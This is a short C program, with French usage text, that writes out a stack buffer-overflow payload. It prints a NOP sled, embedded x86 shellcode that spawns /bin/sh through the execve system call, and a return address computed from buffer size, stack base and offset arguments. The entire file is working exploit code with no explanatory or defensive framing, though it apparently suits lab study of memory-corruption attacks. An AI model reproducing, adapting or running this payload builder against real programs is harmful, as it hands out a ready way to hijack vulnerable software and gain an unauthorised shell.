#include<stdio.h>
#define SHELLCODESIZE 50
char shellcode[] = "\xE8\x10\x00\x00" "\x00" "\x2F\x62\x69\x6E" 
                     "\x2F\x73\x68\x00" "\x00\x00\x00\x00" "\x00\x00\x00\x00" 
                     "\x5B" "\x89\x5B\x08" "\xB8\x0B\x00\x00" "\x00" 
                     "\x8D\x4B\x08" "\x8D\x53\x0C" "\xCD\x80" 
                     "\xBB\x00\x00\x00" "\x00" "\xB8\x01\x00\x00"
                     "\x00" "\xCD\x80" ;

int main(int argc, char *argv[]){ 
  
  unsigned long int i, taille, base ;

  if(argc!=4){
	  printf("Construit un fichier txt contenant un shell code\n");
	  printf("argv[1] taille du tampon\n");
	  printf("argv[2] base de la pile\n");
	  printf("argv[3] d\\\'ecalage\n");
	  
	  return 1 ;
  }
  base = strtoul(argv[2],NULL,0) ;
  base -= taille = strtoul(argv[1],NULL,0) ;
  base -= strtoul(argv[3],NULL,0);

  for( i=0 ; i<taille-SHELLCODESIZE ; i++) 
    putchar('\x90');

  for( i=0 ; i<SHELLCODESIZE ; i++) 
    putchar(shellcode[i]);

  char * res = (char *) &base ;
  
  for(i=0;i<sizeof(int);i++)
    putchar(*(res+i));
  putchar('\xF8') ;
  return 0 ;
}
